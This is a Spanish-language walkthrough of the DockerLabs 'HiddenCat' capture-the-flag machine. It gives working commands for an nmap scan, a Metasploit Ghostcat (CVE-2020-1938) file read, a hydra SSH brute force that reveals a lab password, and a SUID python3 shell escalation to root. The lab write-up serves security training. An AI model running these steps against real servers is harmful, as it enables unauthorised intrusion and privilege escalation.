### HiddenCat-DockerLabs🇪🇸

#### 1. En primer lugar descomprimiremos los archivos facilitados y los moveremos a nuestro area de trabajo.
```bash
 unzip hiddencat.zip 
```

<img width="824" height="230" alt="image" src="https://github.com/user-attachments/assets/fc3b3c32-58a6-4e59-bc22-acae4263e3c6" />


#### 1.2 Ahora vamos a encender el laboratorio y lo podremos en marcha.
```bash
 sudo bash ./auto_deploy.sh hiddencat.tar 
```

<img width="822" height="224" alt="image" src="https://github.com/user-attachments/assets/725ae306-9cde-4d0b-8c62-cc6811669dd7" />


#### 2. Ahora vamos a proceder a probar los pings para ver que la máquina está funcionado.
```bash
 ping -c3 172.17.0.2
```

<img width="829" height="276" alt="image" src="https://github.com/user-attachments/assets/340f1921-7aa8-4c28-9a26-8c1a670cbbf8" />


#### 3. Realizaremos un escaneo de puertos abiertos con nmap.
```bash
nmap -sCV 172.17.0.2
```

<img width="829" height="462" alt="image" src="https://github.com/user-attachments/assets/3ee56f56-a104-4192-8dc1-577a300e884f" />


#### 4. Ahora vamos a usar la consola msf con  con Ghostcat (CVE-2020-1938) para poder encontrar el usuario mediante fake authentification.
```bash
msfconsole
use auxiliary/admin/http/tomcat_ghostcat
 set RHOSTS 172.17.0.2
 set FILENAME /WEB-INF/web.xml
run
```

<img width="817" height="822" alt="image" src="https://github.com/user-attachments/assets/246e9b28-d3dc-4d90-bd86-c65a1dc6a625" />


#### 5. Ahora vamos ap roceder a realizar fuerza bruta para conocer la contraseña mediante hydra.
```bash
hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

<img width="823" height="299" alt="image" src="https://github.com/user-attachments/assets/255bed25-1eb0-4a65-a12d-793aea320d56" />


#### 6. Ahora entraremos al usuario mediante ssh.
```bash
 ssh jerry@172.17.0.2
# passwd: chocolate
```

<img width="832" height="382" alt="image" src="https://github.com/user-attachments/assets/8bc889aa-dd82-4dd3-a7ce-9233413accff" />


#### 7. Ahora para ver los binarios que puede ejecutar haremos `sudo -l` y `find / -perm -4000 -type f 2>/dev/null`


<img width="838" height="407" alt="image" src="https://github.com/user-attachments/assets/f45deee2-f2f1-4869-a709-22b459f92b17" />


#### 7.2 Ahora iremos a nuestra web de confianza para realizar un exploit de escala de privilegios con los binarios que podemos modificar.
https://gtfobins.org/gtfobins/python/#shell
```bash
/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<img width="807" height="202" alt="image" src="https://github.com/user-attachments/assets/e0c81141-66f3-4041-b406-eeb18f493ea8" />















